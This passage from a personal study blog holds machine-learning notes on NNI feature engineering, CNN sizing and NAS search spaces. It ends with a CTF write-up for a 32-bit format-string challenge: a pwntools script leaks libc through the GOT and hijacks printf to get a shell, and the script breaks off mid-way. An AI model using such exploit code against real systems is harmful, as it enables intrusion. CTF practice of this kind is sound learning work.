<p>初始AUC为0.932367，使用了NNI自动特征工程之后，AUC上升到了0.97343，比原始精确度高出许多。</p>
<h3 id="Overview-1"><a href="#Overview-1" class="headerlink" title="Overview"></a>Overview</h3><img data-src="http://qiniu.garen-wang.top/static/images/NNI-Student-Program-2020-Task3/example1.png">
<h3 id="Top-10-Trials-1"><a href="#Top-10-Trials-1" class="headerlink" title="Top 10 Trials"></a>Top 10 Trials</h3><img data-src="http://qiniu.garen-wang.top/static/images/NNI-Student-Program-2020-Task3/example2.png">
<h3 id="Default"><a href="#Default" class="headerlink" title="Default"></a>Default</h3><p>Sorted Default MetricMetric</p>
<img data-src="http://qiniu.garen-wang.top/static/images/NNI-Student-Program-2020-Task3/example3.png">
<h3 id="Hyper-parameter-1"><a href="#Hyper-parameter-1" class="headerlink" title="Hyper-parameter"></a>Hyper-parameter</h3><img data-src="http://qiniu.garen-wang.top/static/images/NNI-Student-Program-2020-Task3/example4.png">
<h3 id="Feature-Importance-of-Top-1-Trial-1"><a href="#Feature-Importance-of-Top-1-Trial-1" class="headerlink" title="Feature Importance of Top 1 Trial"></a>Feature Importance of Top 1 Trial</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">                     feature_name  split  ...  split_percent  feature_score</span><br><span class="line">113          count_chest-pain_sex      4  ...       9.302326       0.197441</span><br><span class="line">37      AGG_var_chest-pain_hr-max      5  ...      11.627907       0.083669</span><br><span class="line">53         AGG_median_age_vessels      3  ...       6.976744       0.075381</span><br><span class="line">0                             age      3  ...       6.976744       0.058558</span><br><span class="line">12                           thal      2  ...       4.651163       0.056385</span><br><span class="line">..                            ...    ...  ...            ...            ...</span><br><span class="line">54            AGG_max_sex_vessels      0  ...       0.000000       0.000000</span><br><span class="line">52   AGG_median_chest-pain_hr-max      0  ...       0.000000       0.000000</span><br><span class="line">51     AGG_median_bs-fasting_thal      0  ...       0.000000       0.000000</span><br><span class="line">50       AGG_mean_age_cholesterol      0  ...       0.000000       0.000000</span><br><span class="line">138            AGG_var_sex_hr-max      0  ...       0.000000       0.000000</span><br><span class="line"></span><br><span class="line">[139 rows x 6 columns]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://garen-wang.top/2021/01/27/Feature-Engineering-Learning-Notes/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Garen Wang">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Garen Wang's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/01/27/Feature-Engineering-Learning-Notes/" class="post-title-link" itemprop="url">Feature Engineering Learning Notes</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-01-27 15:06:32" itemprop="dateCreated datePublished" datetime="2021-01-27T15:06:32+08:00">2021-01-27</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-03-18 21:26:59" itemprop="dateModified" datetime="2021-03-18T21:26:59+08:00">2021-03-18</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><h3 id="特征的定义"><a href="#特征的定义" class="headerlink" title="特征的定义"></a>特征的定义</h3><p>feature就是从数据中提取出来的有用的属性。</p>
<h3 id="特征工程的定义"><a href="#特征工程的定义" class="headerlink" title="特征工程的定义"></a>特征工程的定义</h3><p>特征工程(Feature Engineering)是机器学习中的一个重要分支，指的是通过运用多种数据处理方法，将把原始数据转化成更好的特征的过程。</p>
<p>特征有优劣之分，更好的特征更适合机器学习，意味着能够训练出更好的结果。</p>
<h2 id="特征处理"><a href="#特征处理" class="headerlink" title="特征处理"></a>特征处理</h2><h3 id="去除异常数据"><a href="#去除异常数据" class="headerlink" title="去除异常数据"></a>去除异常数据</h3><p>特征清洗即在数据中去除异常数据。常见的去除异常数据方式可以基于简单统计方法借助$3\delta$原则来去除，也可以用KNN算法等内容来处理。</p>
<h3 id="处理缺失数据"><a href="#处理缺失数据" class="headerlink" title="处理缺失数据"></a>处理缺失数据</h3><p>拿数据来训练自然需要各类数据数量较均匀，有缺失会对模型准确度造成影响。</p>
<p>至于如何处理缺失数据，有几个原则：</p>
<ol>
<li>该类数据缺失得太多了，干脆全部丢弃。</li>
<li>缺失得不多的话，可以利用均值或中位数补充少量数据。</li>
<li>利用其他的算法进行缺失数据的预测，做prediction然后补齐。</li>
</ol>
<h3 id="数据采样及均衡操作"><a href="#数据采样及均衡操作" class="headerlink" title="数据采样及均衡操作"></a>数据采样及均衡操作</h3><p>做分类任务的话，正负样本要求数量较均衡，如果给定数据不均衡的话就需要数据采样操作。</p>
<p>数据采样的操作主要有两种：上采样和下采样。</p>
<h4 id="下采样"><a href="#下采样" class="headerlink" title="下采样"></a>下采样</h4><p>当正负两类数据规模都比较大时，可以适当对数据多的那一类进行欠采样。</p>
<h4 id="上采样"><a href="#上采样" class="headerlink" title="上采样"></a>上采样</h4><p>当正负两类规模都比较小时，应该对数据少的那一类做过采样操作，经常可以用到一个叫SMOTE的过采样算法来合成新样本，使得两类规模相当。</p>
<h3 id="特征预处理"><a href="#特征预处理" class="headerlink" title="特征预处理"></a>特征预处理</h3><h4 id="数值数据"><a href="#数值数据" class="headerlink" title="数值数据"></a>数值数据</h4><p>针对普通数值型数据，一般可以使用MinMax或者标准化来做无量纲化操作。</p>
<p>这里的所谓标准化方法，就是处理出均值和方差，每个数据就表示成跟均值差了多少个方差（带正负符号）。</p>
<p>两种方法分别可以在<code>sklearn.preprocessing</code>的<code>StandardScaler</code>和<code>MinMaxScaler</code>找到。</p>
<h4 id="分类数据"><a href="#分类数据" class="headerlink" title="分类数据"></a>分类数据</h4><p>针对分类数据，经常需要转化成OneHot编码，这个操作可以在<code>pandas</code>或者<code>sklearn</code>里做到。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> OneHotEncoder, LabelEncoder</span><br><span class="line"></span><br><span class="line">data = pd.DataFrame(&#123;<span class="string">&#x27;age&#x27;</span>: [<span class="number">4</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">3</span>], <span class="string">&#x27;pet&#x27;</span>: [<span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;dog&#x27;</span>, <span class="string">&#x27;dog&#x27;</span>, <span class="string">&#x27;fish&#x27;</span>]&#125;)</span><br><span class="line"><span class="comment"># method 1</span></span><br><span class="line">pet_values = LabelEncoder.fit_transform(data.pet) <span class="comment"># [0, 1, 1, 2]，即离散化</span></span><br><span class="line">OneHotEncoder().fit_transform(pet_values.reshape(-<span class="number">1</span>, <span class="number">1</span>)).toarray()</span><br><span class="line"><span class="comment"># method 2</span></span><br><span class="line">pd.get_dummies(data,columns=[<span class="string">&#x27;pet&#x27;</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="时间数据"><a href="#时间数据" class="headerlink" title="时间数据"></a>时间数据</h4><p>时间数据最简便的是用<code>pandas</code>中的<code>DatetimeIndex</code>直接做。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://garen-wang.top/2021/01/25/Convolution-Neural-Network-Learning-Notes/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Garen Wang">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Garen Wang's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/01/25/Convolution-Neural-Network-Learning-Notes/" class="post-title-link" itemprop="url">Convolution Neural Network Learning Notes</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-01-25 13:00:29" itemprop="dateCreated datePublished" datetime="2021-01-25T13:00:29+08:00">2021-01-25</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-03-18 21:26:59" itemprop="dateModified" datetime="2021-03-18T21:26:59+08:00">2021-03-18</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="Definition-of-Convolution-Neural-Network"><a href="#Definition-of-Convolution-Neural-Network" class="headerlink" title="Definition of Convolution Neural Network"></a>Definition of Convolution Neural Network</h2><p>Definition in Discrete Mathematics:</p>
<script type="math/tex; mode=display">h(x) = (f*g)(x) = \sum_{t=-\infty}^{\infty} f(t)g(x-t)</script><p>Two-dimensional Definition(I: image, K: kernal, cross-correlation):</p>
<script type="math/tex; mode=display">h(i,j) = (I*K)(i,j) = \sum_m \sum_n I(i-m,j-n)K(m,n)</script><p>However, our convolution here does not reverse kernal, which means actually:</p>
<script type="math/tex; mode=display">h(i,j) = (I*K)(i,j) = \sum_m \sum_n I(i+m,j+n)K(m,n)</script><p>Without reversed kernal, the operation is exactly the matrix dot multiplication.</p>
<h2 id="Relevant-Concepts"><a href="#Relevant-Concepts" class="headerlink" title="Relevant Concepts"></a>Relevant Concepts</h2><p>A kernal is a square matrix responsible for extracting a feature from input. When using multiple kernal, we can extract multiple features from the same picture sample.</p>
<p>The size of kernal is commonly an odd number, and especially there exists 1*1 kernal.</p>
<p>The set of convolution kernals is called Filter. The number of kernal in a filter is usually euqal to that of input channels. For example, when processing RGB pictures, we usually use three kernals to calculate with corresponding channels, and these three kernals can be included in a filter.</p>
<p>Similarly with neural network learnt before, there is a bias corresponding with each filter, whose size is the same as the output size of the filter.</p>
<p>Several filters and their corresponding bias matrices consist of a WeightsBias.</p>
<p>Stride is a parameter of a convolution layer, which stands for the increment of coordination of width and height after each update is done. By default the stride is set 1. Obviously, the bigger the stride, the smaller the output size.</p>
<p>Padding is used when we want to control the output size. When padding is needed, we will add several layer of zeros on the edge of original matrix, thus incrementing the size. By default the padding is 0. On the contrary, the bigger the padding, the bigger the output size.</p>
<h2 id="Size-Calculation"><a href="#Size-Calculation" class="headerlink" title="Size Calculation"></a>Size Calculation</h2><p>Actually we can calculate the width and height of output:</p>
<script type="math/tex; mode=display">Width_{out} = \lfloor \frac{Width_{in} - Width_{K} + 2Padding}{Stride} \rfloor + 1</script><script type="math/tex; mode=display">Height_{out} = \lfloor \frac{Height_{in} - Height_{K} + 2Padding}{Stride} \rfloor+ 1</script><h2 id="About-PyTorch"><a href="#About-PyTorch" class="headerlink" title="About PyTorch"></a>About PyTorch</h2><p>When retrieving data from the dataloader previously loaded, the dimension of the input tensor is 4, respectively:</p>
<ol>
<li>batch size: int, one part of hyper-parameter</li>
<li>input channels: int, the number of channels of data(gray-scale: 1, RGB: 3)</li>
<li>width: int, consistent with dataset</li>
<li>height: int, consistent with dataset</li>
</ol>
<p>The number of first dimension remains unchanged during the whole forward process. However, input channels will be changed according to our design of convolution layers. Width and height can be calculated by applying the formulas above.</p>
<p>When <code>LayerChoice</code> and <code>InputChoice</code> are used in definition of model, we must guarantee each calculation is meaningful rather than size dismatched.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NeuralNet</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(NeuralNet, self).__init__()</span><br><span class="line">        self.conv1 = mutables.LayerChoice(OrderedDict([</span><br><span class="line">            (<span class="string">&quot;conv3*3&quot;</span>, nn.Conv2d(<span class="number">3</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">1</span>)),</span><br><span class="line">            (<span class="string">&quot;conv5*5&quot;</span>, nn.Conv2d(<span class="number">3</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">1</span>))</span><br><span class="line">        ]), key=<span class="string">&#x27;conv1&#x27;</span>)</span><br><span class="line">        self.mid_conv = mutables.LayerChoice([</span><br><span class="line">            nn.Conv2d(<span class="number">8</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">1</span>, padding=<span class="number">1</span>),</span><br><span class="line">            nn.Conv2d(<span class="number">8</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">1</span>, padding=<span class="number">2</span>)</span><br><span class="line">        ], key=<span class="string">&#x27;mid_conv&#x27;</span>)</span><br><span class="line">        self.conv2 = nn.Conv2d(<span class="number">8</span>, <span class="number">16</span>, <span class="number">5</span>, <span class="number">1</span>)</span><br><span class="line">        self.pool = nn.MaxPool2d(<span class="number">2</span>, <span class="number">2</span>)</span><br><span class="line">        self.func1 = nn.Linear(<span class="number">16</span> * <span class="number">5</span> * <span class="number">5</span>, <span class="number">120</span>)</span><br><span class="line">        self.func2 = nn.Linear(<span class="number">120</span>, <span class="number">84</span>)</span><br><span class="line">        self.func3 = nn.Linear(<span class="number">84</span>, <span class="number">10</span>)</span><br><span class="line">        self.input_switch = mutables.InputChoice(n_candidates=<span class="number">2</span>, n_chosen=<span class="number">1</span>, key=<span class="string">&quot;skip_conv&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, x</span>):</span></span><br><span class="line">        x = self.pool(F.relu(self.conv1(x)))</span><br><span class="line">        old_x = x</span><br><span class="line">        zero_x = torch.zeros_like(old_x)</span><br><span class="line">        skip_x = self.input_switch([zero_x, old_x])</span><br><span class="line">        x = F.relu(self.mid_conv(x))</span><br><span class="line">        x += skip_x</span><br><span class="line">        x = self.pool(F.relu(self.conv2(x)))</span><br><span class="line">        x = x.view(-<span class="number">1</span>, <span class="number">16</span> * <span class="number">5</span> * <span class="number">5</span>)</span><br><span class="line">        x = F.relu(self.func1(x))</span><br><span class="line">        x = F.relu(self.func2(x))</span><br><span class="line">        x = self.func3(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>In this example, dataset is CIFAR-10, where all samples are 32*32.</p>
<p>When<code>x = self.conv1(x)</code>, now the size may be 30 or 28. After 2*2 pooling, the size(width and height) may be 15 or 14.</p>
<p>Here we must make the size unchanged after <code>x = self.mid_conv(x)</code> since it is a layer allowed to be skipped. And we can see when kernal size is 3, padding is 1 and kernal size equals 5, padding euqals 2, width and height both remain unchanged.</p>
<p>After <code>x = self.conv2(x)</code>, the size shrinks to 10 or 11. After max-pooling, the size becomes 5 as expected.</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://garen-wang.top/2021/01/23/NNI-Exploration-Learning-Notes/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Garen Wang">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Garen Wang's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/01/23/NNI-Exploration-Learning-Notes/" class="post-title-link" itemprop="url">NNI Exploration Learning Notes</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-01-23 23:19:35" itemprop="dateCreated datePublished" datetime="2021-01-23T23:19:35+08:00">2021-01-23</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-03-18 21:26:59" itemprop="dateModified" datetime="2021-03-18T21:26:59+08:00">2021-03-18</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="未完成任务"><a href="#未完成任务" class="headerlink" title="未完成任务"></a>未完成任务</h2><h3 id="Task-2-2"><a href="#Task-2-2" class="headerlink" title="Task 2.2"></a>Task 2.2</h3><p>-[] HPO<br>-[] 在搜索空间中选择随机结构，并验证性能<br>-[] NAS</p>
<h3 id="Task-3-1"><a href="#Task-3-1" class="headerlink" title="Task 3.1"></a>Task 3.1</h3><p>-[] 跑通NNI Feature Engineering Sample</p>
<h3 id="Task-3-2"><a href="#Task-3-2" class="headerlink" title="Task 3.2"></a>Task 3.2</h3><h4 id="Task-3-2-1"><a href="#Task-3-2-1" class="headerlink" title="Task 3.2.1"></a>Task 3.2.1</h4><h4 id="Task-3-2-2"><a href="#Task-3-2-2" class="headerlink" title="Task 3.2.2"></a>Task 3.2.2</h4><h3 id="Task-4"><a href="#Task-4" class="headerlink" title="Task 4"></a>Task 4</h3><h2 id="HPO"><a href="#HPO" class="headerlink" title="HPO"></a>HPO</h2><p>超参调优在NNI中比较好实现，只要有参数和模型的搜索空间，就可以利用NNI自带的tuner来做调参工作。</p>
<h3 id="Assessor"><a href="#Assessor" class="headerlink" title="Assessor"></a>Assessor</h3><p>在数据量较大的情况下，一般一个trial普遍会比较久，NNI支持Assessor，实现在调优过程中类似“剪枝”的功能，提供了提前终止某些trial的策略以节省实验时间。</p>
<p>需要添加assessor时只需在<code>config.yml</code>中添加，这里以Curvefitting为例：</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">assessor:</span></span><br><span class="line">  <span class="attr">builtinAssessorName:</span> <span class="string">Curvefitting</span></span><br><span class="line">  <span class="attr">classArgs:</span></span><br><span class="line">    <span class="attr">epoch_num:</span> <span class="number">10</span></span><br><span class="line">    <span class="attr">threshold:</span> <span class="number">0.9</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="NAS"><a href="#NAS" class="headerlink" title="NAS"></a>NAS</h2><h3 id="搜索空间的编写"><a href="#搜索空间的编写" class="headerlink" title="搜索空间的编写"></a>搜索空间的编写</h3><p>在做NAS的过程中，我们需要手动写出待搜索的模型的类，我们借助NNI中的mutables来实现模型搜索空间的构建。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NeuralNet</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(NeuralNet, self).__init__()</span><br><span class="line">        self.conv1 = mutables.LayerChoice([</span><br><span class="line">            nn.Conv2d(<span class="number">3</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">1</span>, padding=<span class="number">1</span>),</span><br><span class="line">            nn.Conv2d(<span class="number">3</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">1</span>, padding=<span class="number">2</span>)</span><br><span class="line">        ], key=<span class="string">&#x27;conv1&#x27;</span>)</span><br><span class="line">        self.mid_conv = mutables.LayerChoice([</span><br><span class="line">            nn.Conv2d(<span class="number">8</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">1</span>, padding=<span class="number">1</span>),</span><br><span class="line">            nn.Conv2d(<span class="number">8</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">1</span>, padding=<span class="number">2</span>)</span><br><span class="line">        ], key=<span class="string">&#x27;mid_conv&#x27;</span>)</span><br><span class="line">        self.conv2 = nn.Conv2d(<span class="number">8</span>, <span class="number">16</span>, <span class="number">5</span>, <span class="number">1</span>)</span><br><span class="line">        self.pool = nn.MaxPool2d(<span class="number">2</span>, <span class="number">2</span>)</span><br><span class="line">        self.func1 = nn.Linear(<span class="number">16</span> * <span class="number">5</span> * <span class="number">5</span>, <span class="number">120</span>)</span><br><span class="line">        self.func2 = nn.Linear(<span class="number">120</span>, <span class="number">84</span>)</span><br><span class="line">        self.func3 = nn.Linear(<span class="number">84</span>, <span class="number">10</span>)</span><br><span class="line">        self.input_switch = mutables.InputChoice(n_candidates=<span class="number">1</span>, key=<span class="string">&#x27;skip&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, x</span>):</span></span><br><span class="line">        x = self.pool(F.relu(self.conv1(x)))</span><br><span class="line">        x = self.mid_conv(x)</span><br><span class="line">        skip_x = self.input_switch([x])</span><br><span class="line">        x = self.conv2(x)</span><br><span class="line">        <span class="keyword">if</span> skip_x <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            x = x + skip_x</span><br><span class="line">        x = self.pool(F.relu(x))</span><br><span class="line">        x = x.view(-<span class="number">1</span>, <span class="number">16</span> * <span class="number">5</span> * <span class="number">5</span>)</span><br><span class="line">        x = F.relu(self.func1(x))</span><br><span class="line">        x = F.relu(self.func2(x))</span><br><span class="line">        x = self.func3(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br></pre></td></tr></table></figure>
<p><code>mutables.LayerChoice</code>实现了神经网络模型中一层的多选一，待选的神经网络层只需要在里面列出来即可。例如上面的代码，就实现了3*3和5*5两种二维卷积层的选择空间。</p>
<p><code>mutables.InputChoice</code>实现了可跳过连接。在上述代码中，表示了mid_conv层是可跳过层。可跳过层的前后代码保持不变，在可跳过层则需要从可能连接加入到后一层的输出中。</p>
<h3 id="Classical-NAS"><a href="#Classical-NAS" class="headerlink" title="Classical NAS"></a>Classical NAS</h3><h3 id="One-shot-NAS"><a href="#One-shot-NAS" class="headerlink" title="One-shot NAS"></a>One-shot NAS</h3><h3 id="DARTS"><a href="#DARTS" class="headerlink" title="DARTS"></a>DARTS</h3><h3 id="ENAS"><a href="#ENAS" class="headerlink" title="ENAS"></a>ENAS</h3>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://garen-wang.top/2021/01/22/Writeup-for-Second-Week/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Garen Wang">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Garen Wang's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/01/22/Writeup-for-Second-Week/" class="post-title-link" itemprop="url">Writeup for Second Week</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-01-22 11:11:17" itemprop="dateCreated datePublished" datetime="2021-01-22T11:11:17+08:00">2021-01-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-03-18 21:26:59" itemprop="dateModified" datetime="2021-03-18T21:26:59+08:00">2021-03-18</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="axb-2019-fmt32"><a href="#axb-2019-fmt32" class="headerlink" title="axb_2019_fmt32"></a>axb_2019_fmt32</h2><p>32位格式化字符串漏洞，有几个特点需要注意：</p>
<ol>
<li>测偏移的时候会发现没有完整四位四位的偏移，此时需要在最开始多补一位，这样保证后面都是从8的偏移开始。</li>
<li>用格式化字符串漏洞泄露libc的时候用<code>%s</code>，然后第一个4位是got.plt表上的地址，第二个4位才是真正的地址。</li>
<li><code>fmtstr_payload</code>填了四个参数，其中注意<code>numbwritten</code>参数，意思是格式化字符串中前面已有的字符数。0xa就是<code>Repeater:A</code>的位数。</li>
<li>最后劫持了<code>printf</code>的got表，填个分号做命令分割，就直接拿shell了。</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="string">&#x27;26090&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = &#x27;XAAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p&#x27;</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> + p32(puts_got) + <span class="string">b&#x27;%8$s&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Please tell me:&#x27;</span>, payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Repeater:A&quot;</span>)</span><br><span class="line">puts_addr = p.recv(<span class="number">8</span>)[-<span class="number">4</span>:]</span><br><span class="line">puts_addr = u32(puts_addr)</span><br><span class="line">log.info(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"><span class="comment"># 